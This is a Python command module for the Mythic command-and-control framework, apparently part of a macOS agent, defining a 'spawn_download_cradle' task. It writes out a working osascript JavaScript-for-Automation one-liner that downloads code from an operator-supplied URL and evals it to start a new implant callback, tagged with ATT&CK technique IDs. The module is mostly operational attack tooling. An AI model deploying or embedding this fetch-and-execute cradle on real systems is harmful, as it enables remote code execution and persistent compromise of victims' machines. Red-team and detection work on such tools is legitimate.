from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class SpawnDownloadCradleArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="full URL of hosted payload",
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a path to a file")
        self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SpawnDownloadCradleCommand(CommandBase):
    cmd = "spawn_download_cradle"
    needs_admin = False
    help_cmd = "spawn_download_cradle"
    description = "Spawn a new osascript download cradle as a backgrounded process to launch a new callback"
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1059.002", "T1553.001", "T1620"]
    argument_class = SpawnDownloadCradleArguments

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="/usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('{}')),$.NSUTF8StringEncoding)));\"".format(taskData.args.get_arg("url")),
            BaseArtifactType="Process Create"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
